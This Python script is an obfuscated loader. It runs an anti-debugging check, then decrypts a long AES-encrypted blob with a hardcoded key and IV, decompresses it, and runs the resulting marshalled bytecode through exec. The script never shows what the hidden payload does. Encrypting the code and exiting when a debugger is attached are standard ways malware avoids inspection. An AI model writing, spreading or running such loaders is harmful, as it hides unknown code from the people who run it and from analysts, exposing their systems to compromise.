
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\x86\xac\xca(A\xf0a\xbf\x1c04\xd0\r\x03\xfc \xda9[\x1f\xb2\x1daV\t\xad\x96$~D\x1aQ'
_IV = b'\xa2F`\x16\x8a\xd6?b_ka0$\xba\x1b\xe9'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = '-qGromvH35&1aBB!*+JdYb9A5C~IuAe^;}JYB>BR6>2(!NI%*p^k&ey-Jc&3NSKj4glFAV(@+UbvFB<2V`=8qS_JuKSeFg16**gmTuO522bd>O*=3t)`E^aR&VKDQ0*KT-z;FBoa>`Hl;P7kY9ovD78cS0)sws4glna>o2_3ez+lZM)FHBoi_Pq|`f0Mz2Bj;c81GuUe`b{Ej5*J08E;K@)qIOq;-}S)NbRXtI4iD-d%MfL$IognD6^uuNNirWXg6D^?`zvsZGDZ}+4A`w$?_PSMA6ro;mH=XC7U1!JcK7PTYY^y)TcWLyQNbA~dF|Mu`yi1DcYyWZdBY;J{C}sx_hE`5ptLcaL5@UaLo#E=Ilm>(X%EBm^1PaUuLGezg^_@=N}}5VdjgLhoIl!QG4x@)*$!UJ@ru_4>huw#AYsAxwCm5WDoP5%LEJ--Aj>qrE9}1O@{5DTH5Gz0EjrNDhs3$dAeRo3;cQNlN}beN^G-xh1$m3;Qw(Zwh=OK)1M!Qs!$8wu;S&)9i27q~>oVoBJN+LLp@YFx3;WptlZuC8I|lI^iuEz9&LAiJ6cwc>#T=liP9>=locbDbCyhuYklh$BT(uy4?Cr@wD7(S0J6S_ldcLA>)Or6wGhtnOX0<cE{5<IXdizXb+uuWiAHC8JSI1$JAW>gP<7P|=j$4<9d3~YmwCOX|S-@1#bSGtta{PRQ;F{@?f!KXohTcQo<Vks3_rqYL8Y&8OwS2~?NL~Ov#D|nOHC<{}TGJy4^*!F>-&%Jk`%r?D&=wt%jcanSDvCc8@)5L(1bq!=pJv=Of=i{GjqpMkV&^~$!8dJeCMIB7W?q#gp$lm!g`ax&fILGz8WG+V==wpq9F-WKt)Iz;T6kLjQG*G52?%{A4>xA?t8(+no@iAL_+<gfo;b|uFN?r>Olp<PrQ;p;+4bVV>{A=+xaHQ8U#fpR((?rX<*`@2;9#tIJcoJ=dqQ3`STAnrj~)2lbIc$FM#X&wTVZun+-P|Jvcag8RW1c|CdO6e`7DA{`E|GjqV&xlz<cLd^X2>rSmhxD^1(GEik(-N&Ze*dMGq91FWk?rIF~P|=WrPUG~y~8Yb2u4A<RLkcTb&$ziJ)-Ny{$Na@sNIVUd^Zhw^vFZpFn6WQ4VXOj_&9>Qmeeqbw7+Ta`|~S3Fq}CiPx<ibV2E(Jlpq`O$~r$tMkccZbt~#G;wEFhsR+4^!+-(@*2(VJr*;tJ$t`VwT!c$78bh%RS$PB5EYczpI`(%tI>LwDRIQ?uQ?(B}RK6hP3!ZZsyky$1=+>)Su@!LAgE%z51fs!|ZsE`1w`d9`WpMYn94aV)a=v{0gw({9hl6ZVbK%D&@%o5Y=&>sN1gdWpIHvuSXi^^Ks<l1^k-_)N<8DHTS-(UnF!lSFUMGOMZS!UgQxR7zg5=Cdqp|y|Cl7ZR8veWWuzQO{_Wrzf$oht&R)t9F~?^>EF^NRgEx@51BORoM`bVH25B#34%<q6KZEUScJ03-_Y{aDANh7#kWvov1k1RspE)qQh4eD=#Q&paDM*O*N2iHHh#)+3lQ`xrSGqMFg7j{O{=d0V<)%u?w9^uFv~Bn{d-=Mj1VL7z4eTyQ6YWjpsZ-r@hOPMBO^?BX3{+t_oyRTcr@w`6SJ;K60kI8JSWzM@{}w;1AvC$hy9P>nD@>G-7F-LR%fD;;$%%&o7wK&y72yPo`MeLYcZrQX5^+0;y1>8ihwd!WAq)~^`*W7(ufifstAscz_bIwF5b_WSuJIB3l*eMf;@|SU)V53eqX1%z9EP~<IV1gooGqK-Vv!qR99NzE9vt!h`^Wz6c$@i0&#aQa3^waIW5b^UxS?<ivf$i_-6g_Tn~p(hS0<x>ps;7tsuS*g#gk#6$Sk_4YT9C-f&LTNs9Hg#a6H)kcY7VtBx$c05^^vX$dwBin2YfWb=)fJ*}Mzi%F~2Zs~PYD$I$YZIyB63kt8#r{ir(krf@)a@iKw>o+Xgn&u77zrR@`b_XcrqhWQndE$ksXeqwre66;6yhW%KF@4N4OdgRE0r0h*4Jfs4&G%5JfoZ;g$3jcaP2Y~Ctn#SBYxxc!VnQPx?L<by>f7a>yl%+y6EmA5+_5q67X*ZQ!jf_*R#97tIoDu0Q^4kHBVzzONLoL~t!pXNoQX^9Tz5=R8RP*Z4M$g)tW^c?TF*pd0||g>1o#?B@OG-@`y^f^{eO@$8Pz%=5X&Z#q)JOY=yeVpQ<xIA(_V^kabD0FXMLLOjL|(|3J3K+>#C;(LK!a)^gt&{7kGR@P>YpoeEFuvqOX@q*JTEHw_R`>=P#S(f|Hmuja;1BpdkF^_wExROZ~Rp2x}=fb+WPAwwDC~pN<CE9W~;-(cR9EEg4DE4UyVQ&rP+yIeiRB4Mi?bnWvuNZ~|kUh^wf+dQYTu*e!;{w!Z+B2?y$(Oe#9=3m?U<jW8Ov{fIGoHETEm;V9qE8X`3d*X?!8cbft^m3A@1gfidzo}GE;n|IOW&{W<hUig1I=the2-xi;TD{+g_<$Q8WOSLF%qtjl`<HE}V+?iN`xMT4PeM*yM$|_2x%~xP!8R;%-cU65SQxHy6%u;sc{K{hdy%l(T;qal`tQ>b;CzL<gzu->s))#`-Kzj*<bQK)|1IG9(9)mElL=GX9<S#QM<h^~90e$FUd$Jo~io|A@n23rOgfZe}5ouYeL|)fA$ZNg3Ma@jgxP<$%aj;-HZU+j(t?27VwMjpwmXL`A8FPjz7QO20n{dfP+vbx2^9LA0+<D5&rF;#V=*dcbvvPK72%b~;@4~s7JOcRC7Tt!w$xQRmu*5B7W%!iasObzP+RGw-KSBR$C`w;RuK5;ii;<HCl0B{Now^^`sGAh8DLdJ8+pP$d@NwIbr__8n6~D1LL2)Am+-Y4yn!IX^`7&6WJ3dB^`0FC(Xv2ri;U2;>GP<`RuDlx98J}>b4643m6h@roaJga}CI?o}DF>mx|N3vj7-28b&@*3_L*=oJ9Q0!La<UsXd=n;CtFfHJPz*{0q`9>?7I%c53C73e`G~%1=8>5T=LR|vf?Ht;G=u}`X;b}&7wnC`XZB41vdE2)A4tWH$0+oBJen8&&g$)*s`O{pzTxDcq2B>N{0%4{+!*M2A%ig@DarvSWcJvLm8=$FB!kYVC>!T~t;@`nxpqTIVDH<;4WwK;E1g$a%#c1(+;;evaH5~#%Wrr5vfz~G%^1GGb5JV%AOvNi^}uMx5Qcm~I5u!jCJ4HWS;*mo_m9W+=IQ&wN1;?@inNl|GXcOPNWnJ--xS#5_n8a_OjyGIk<>G`^e5TDdc|xLQ+#es{C3V)Gj?4(zw+wc5(^=)&c_puMUCetl5;wc3eo&HdXl$Ae<|!xkEy=1m^6#c;Lr}5a8nC<<508Vr5{1Ro{$%?^N3Vj`0n=tn)xbW=H%0bcS05XGV_msquKNaM%+9GXHU<xwZ}v{KDYh?OFCr>(<c#0eGMxZn0@T8TO|2h)d)qzQDIYw4Z&PW)Jg%b;^-~AOk>R_9OxA}sNeX~v#hZ^7>3(kvDi>S0UCNf&fMsAemFHs4cnAD3o*eSPS#afoPb*%*dGiThXfr;GpM~wgQ}sW6^R?Z3KrbhFs%3VoZ|w6EYm{bmEco*?7c3D7|1B2h@~PSnV`ofhF7i3&$l8^EVLc9_4+Q{?x(4HLZD8z!D!&$Oc@{samVVkkb{6td-OYb1dM2lcA#Ja&voxAemFB;j$fK=C?q%StUuu1vK)$8AtUL>eW3eOJN0xoSWje#$sj6<o0kE!C-Bn|I}BNY*ucX5cQ|e%f>C##hV`Rk&!z$xB-dfe9H@aSq>{63g4~bIHbX=<fTs0u%4r&Fbz_U5>uD~@2~#Xu^q!JSncV10U6SH7qfZXCR*9E!)4e3dUe3`lDW_zvXy9R>`+vU7Q2!YB4utf+yHDTmw|{eTCqJ=kSlGIjRSb1d&}=!UU<|?$RzT*tUG7_Yf^kczKH($5fLRM?5#R5jTsn%chDr;eLXIx&&$A)*o8|UgK$CbX_VE$<{EFQx3#0fI><i~{9X8qlWQi8hB;JVC#yyO1p<<7tW>iGe9vOC8Hpl1Mz^-1szH-!-`MLPjn@nwygq@{UQZscAiV`=(0zHX76bqS$NV47$j}E3|aJ?BBsKQ?EoOpIjt*PF*CFzX2+GNL&cQV*N3n#cV9$!@y_g)LCOhE<WQbX*xCX)4qe*o`Zj(U8o88ZqRlqT4H(wEl6W*6u-^_=&aPy0<SsmGr^_R~`23Coy&pJHy4i(q6v<()jhP-%0wtQn3nCq@7$rjo*Cv)Jo7lKxU+6HnMfv^uP(okl-E5v|U28u2SIv#IUxg>_*}J3$zzs|<=3F8@e{@*bGQ42FwZh?{-8pvRU`dY7>NNu^7FR1J2^{x1$IWpM{XReLVka3McC<*87sTL6#`L~3lQsxum-6APG>$?BRChlXjA+hzF|Y30mNeAxe_Tp*zE9EXp|sm$?Gw_?eHN=zAjQ{U~rSY{jWqKFbLxAUzY{+i2W%k__?ZhU6+=n$s;W@<E}<~nIuDQX*R^mADqUeGP7^N4kY75H@h=I#pIV!C%=OzH5OShZZ9c&I-of&$S#HJze2CTpFiMB@J?Lo!enX=YTc2u7S1^7fC|RFz+zGuL6m8D-p;kGQIbxpE5&G7eCmI|rT1KM{<TI+}loTa-<AigOGdtDWCl$IvZSZt7B-Ca@7-e6>8L7TWL*uM$l`Fo;&PSZs?DjNEUrLXK7Do>BAy5aCabnqU!`dIOw5dIgQm)UtGuzkKQ}iS9**0a{v7QsM3!wbES7jB(o0)5OXAs}R=|R`51too?CHaPDb)Q%4$bYwl;3V!ND$R52Wgmq%j!S{z#&oe$9zM~qWWTXi)3eIU8}OoI2Dn#AZc2MLyLcQQl2PpVvW$){<{aO4mkl%9G4RvCG$)nb3nFFAbgr>2_Y#Wcz5i>q`TP7(DQ#K3tUv^}@9kYT+b(}Vg+41}Nz@ldwEgd3P+tFPE>FbXf)+}X<hg@x;bR}>MTVLhe~YRXO!e}9qcRBRRM^kO2o{eN1Lk^lqtD=crU4zW#Om;mEf%Fm)!OED!4{BLX$Jnje1v4is!zy1_TmoI1nPS1+v`b7bn6HbPm@RcW%AxjrrXIqqhyjx_0?2wJBy>bqlDNCE26K<CnymIb7A=-`yZUb-j96^A|B3F#F99>-lG*YJU@y2elQ8*cVf4*yVJTby%9yj=b6b+CP0(e9?)csh^0}AsDnEY>ZQ*C|vNK?m(<x~{h&sfefw;I@qX(Z+L^8noxM2(q0quk9Pve>$@sx`*?ghWzstfjI?!;MpU@3TvG=e(YyeGjRc;1co}njX0XGe#xw6q^^`z|ICWEZx4n`4C^x3gaZ<igy;cjn3{qp^oabssLtw^Fsl}f!`?nxW8{q&=>&#5I_{!I3J=DtU_#~!D6pjiQ{=-1Z=h+f1iic-?xDQKPJo3ts!BX%_i4MHj$4bQ-;e`@4y{Mvd)IW;<_FE<pqCDWolI`dJ$M%vh|EIuFDh0ISt&r2rz2|kqM|O|5P<Gl!Sx@Y;7XqzQe3e#^V^skG+J`CH8)JRB)M9O^G4E64nlRP|J@aKGj1mG}5?;K=Npc9wW)cuSVy&EYWEO`a9VElM1S@>0aErVi=2oYL>XQl(IeX*Q}dV|LgyF{L;f~Q@MQJ90-MZWNe9yaA2d}QX>A7=E{KlppAi^QA12>-eN1k5xn6=om(qrj%@=iwO-tkK3a3ts7U{yH?etQJjg^pT#|2W_(_rb4rHWY!{MHT(uqCgCE}6b%YNQRVj;*pr|y3FY53_Syx%^3=HaC(U93D^epdgEeO0x@Hisu6EKD1WL&~p5wy(qEzg`LKGqgU=XLED`wRQ4==l&$y<f|q%)UhN%$;rJ2J;mh2n$NTzIyhe4Ehs_gcK-L%_ew@4S@t^~H}xNy8VkC3?VrH{{5k*zv!GiIOTusN_Q$OdElCH%z@NgKyJ;o&&!*6DSzNwRiFALBHeJ?L3vShGVDm$cwti>ByCiUxONxN<*X3Qf)JW*+_&|Sdf3KvgFl=**#{OhCur|KG?b0KpH>?XyY#?(MjaS7`om%~2zLHU7hqe<k%n}0CtT(?GtOKdAQ2B1(wLKDNBDz4n$xw&UiH&V>LwLUbE}jHRiNSs^Mt&_psMd9sKLNPDoGtE=VPC=_rS>9wx;-m3zrrhkT%%XZq`y@CC$3~r!PdwyUIs5>ckThJoYlXWrU)ot46Rh7EjdcX|I=`Jcn;xxNZ=1X)vEV*-V9#$tAwo)k4wSB!y<I!@4*SY->`a<G?1j*-op~q&@z360&)9va5!!mS5{9+^&Tt$=kWsra~4jfE9trDK&29_QnapC)Jl6|?n7iM<5gfUUW_GcdH_Ve*d9uha>(rwL7#|5`y{I-4}Z(gNk(Ve5q`&Xb@TJ5iZU*cIErpck<^T_!gvNEt9smrH_o8ZZLpU{N4+D#3+0kD(k;(KWSyQD1kS<A`WOEgQyR%SelvW3isuv%W@zXnv|q#1zaE*fU3$kOVd+_xW)6c9%}%f_38|y4Tr(62g?I7)n$;RUm`(daJ5G8E=ai9Q2mR{D=gTXPyX2u2jI$Uq=*818Z$u^0z5mym#8AEkUlg+*<DXCR;sNcrr9S0KQEiey1mO@+LM(-CpX%`7D`aKmh<IM^4R89ILel}GAiguhiP>{jrr`<kVCV}@g~M+=4|rf8fSCkod3Ub|Mm}=Vy-@A=(xjMAAQJ)UJr&tU+H`7~d~^+z`8IT=pkHa-kr+<1z8=lI`He)z@XrMx3x+7s4?RQv^=7Y~qD0st$}YMfl=-74t-bx7r}<Y^X|oqzz7qvMQfNy?tb2@2Y@{i5OwV}YVccjzq&B`T_;K3eem1YkiE{m~SlnfI0Ly1~EW-9&c2lQ0A{_2Decc*mHd6j%9sdlswaH%HFz98BdwFB^(_TtNFCj)H(K=rGjZJJxezz80JVEZAc>Zie(k~g3Mg7tP+#B8b<tH8aJM$6iy7N<e7b*%T7%~&FMhDf&!?O>{V@}gkCehY5IA>Z;Sbqt)#Ka#hPnsH;2-Z2E>hK98ES@3Ofz>l-T%mIgx^T0l#wMo>_IE48BV0Jluw3fRPt8J)25s?X!@Do4-i6?`d!){0@r4QxBF|UUz1J*;t&GHjrh_Ga!K&Q+_>7<*L~zi5<~C>&j9Lq$z)ha<#$MV7-nNh1(n|Q|Zqk^`NDM+Co|ys-$;YO&`^2+4>LjR;Zuqf0Ea1<{K*uEBnLaRmp&AeSnRK5ofUy5EvX|=Le`$il*o)wn%_w_EH&Vgl5g_4d*0zm})q)<?2q5?E>S(M|?9$@5X4L8EXzp%oLl?`dy04raP?h2k8*wRWmC*Yz*B=fogePriH1YGt{~a&1=th?K%nI5JYTUrcwZ`^svLAxSDWJxQhy3`Cipx+eu0|E=sSY^pb#J4{5sp6_d%iP{efSdPxQN#59z=MYAnbIZw$dZ%&Z9X9-58Wq<T;HRY=dkP?7AoB0QbQx#a{%~Q!a}htOp4j{<zt#hhd%J`oIkkzPhvb^DqP)5l5RiVF3_DdGr5e-Y=PBdFr)G%FAt-wA1fQxmsR3Qi!O0@j5xo;>s;ogq?$glhT@|c1LN_Iys8Qlvrz>QOjhTTP}5oOn$&jzJC|n1WLv2qVz{jM9%fES9*5@a`M>>5iG*H@&5nz-Q%HLuE)5q43&<0NPx)ZOGMW<gcWRr--JZ$I)9^52p185S0u=!a8c|DhxcX>3De1J8D+wi%+;%iH-lhaJzkJ<x{LT1R>lg`n$v-3IW0uXy}odQE#5=PF-Nls@AE_Cj2ZHk%0k*f(xhDB7h3Z(oBh?k{2umW(|+LdVM8qbYf2~F+*%1K`iOtBRJGTDGsP3u-KPrpF^6|PXqpEX`HN{(p|%dq6e%Fr0@K?^?&HY&dLcjVulY9wgtrH6Ex!Fj-I>(%yo|6W*Zb8@;#^X4ONXn*=GS@23a9l#>dB|i_otiWR+KzwiOHklmh8Wr-3hfHSiaS{cA;+yGS83A5FBXGr6q6O@`=rhmw;!8!dvy?D6_m-qsCIlw{e)pMJKKXNbR}HQ(!YJWmXcEUPo+R-CmigGalI4uUscWDQ7?~)|X2~GBxykr;4Ivc>Yz`rI`AFB5=@jN7kXe*&5Ug`-CTpI|G}DiHj$Cp+NH>--G)dWmx{wurgvWPFD{k^XbW{BlQH4hiNtA1;D1PKD;&IT6T{=ffoKEO^eKsBaPj$Y_4+|PYeVoqse!DWDP4-H^hD@={BMn8wGTQt@$|nlA7F2vCqdL@~AIjQ)+wGf;|tb?ps0KDBS?2cWWA9r$#${Gj+nS;0#MkPXD$H1Fa<D5|JM}Sn^2n+m{6<<u!ps1WG3?JK{ad6)-VUuDaDnIT3@74}iO$`}<%JrOK!-&EOvDh+66&OLitc%2!!@(pvm{Anf0^C5`3LBPGd-HBhF|XH*Bku6i98zz&wJN=ng9HqH(F69(yF(SkYz;$wcIgTQ(WDS2Ahqq!MwZWHi)Do4kn!T@VNsrJl1tC!S_;kN(Pwn$@&(}}6_j6<R?%vHM72|xSpU$u3wf;AJst0`^#ZbM(SiE>`5zK4OCF=C0m?(c##)I+Hiow>DZydT^%<_twv#pcxl_aQQYq!`=*r(35WOGbA0yhOe)WQU1~dqe%oX)3}pf;%h(P66@-fc<=yZS}1wfxpVO0b&+m5&_i2@O--Lu02$nRxjG(Ec?GM4AJi=NqKx%{ry_*+Z20?OC>07`tEbAoSF8oy5*IJ#$Z-Vs7YCX-tivPllaBjN~t}4Dk~RU>B(i%BN~sqg;R@-e-b`>c}LX@sYt9+*sM1`JxtLUNyF`InH~~FIz(s+oFl!&R2VF{IBG1VG!u`-w#AmW5JD!aPk(-!BcRuSq1|%i+zE3ilq1~KT9{OE<jaL5Md|@x*`X{bm?nVN1-qP-ic8L#cxzsYF9o)gWzjL!7jgEKWbF|`tV`8a>)YOw9W#8iK<W$wt#9PK<CJo&H3bW&Oj4a|>w3fiVp;~hxbiesRB&xJ6cd=laB!1l`5vh$6Rq<Qc;u|&vE3KWQIT=HH(eW}iO(sEKmoc3fo$|AUeBmut(qU}=SS<;kffsqj)y!cc$?QoqW;PH^_lK$^+-|mVgp*d7rmE!2wtx-Np@`VR!=nH8?k!GCuD2hJqZC8LFD%*A-<@S98|%TB&MYA1S=BrY<sjvL!4YmE2>|zP!fUVKl;V?#l;bxdO}OoBMeYQ&7IuHvgk>YT5Maz|Dcq%pVMfbx?|rgCW7TPXJ64?2y)F34~lReQ{t8;?1Bmrp;MP4*y}a%*j@?;I;*oCr=G%+Le#lla~Xtnwjh;Gbze4djHL(iiqK%l4m`P@9b#<m7|I8@K=R;CizAc-wG1aGj^@~y=3XR4fgJA#Vgcw=h_rMCaH&mlIr*)x+Fc<r`DcT-%zdfmVZ(j+%poU*@o&j(NO+jMIVPthrf?MXivOh!>;BeF5+R&8i-S($QUhzh-+H)JmT@kwkHU=pmJOHI|7@k;9ad*t8lzbmd9f>jvLtJ;%$YcQdec(H)k^|_c&OGpWFw(XtE%|Q-(=n^_JMwQfDPWjgCmDhdhU#pd<7p(_YiL~jP6kc>+5KRv1yd`?&y1njdv|_erN6!S;}lFcV+IUe2ALgpROw)<J!>%GbTXn6*e{Ff&`;?n?UG@e7Fs!r0EPI-ce1=%0;8{g9nw^8_aD6gtkDgbLzJCEh&UbWt$s_t@<WKD?om;+@ZR$7!@4aObqG)KPRePny(d-'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        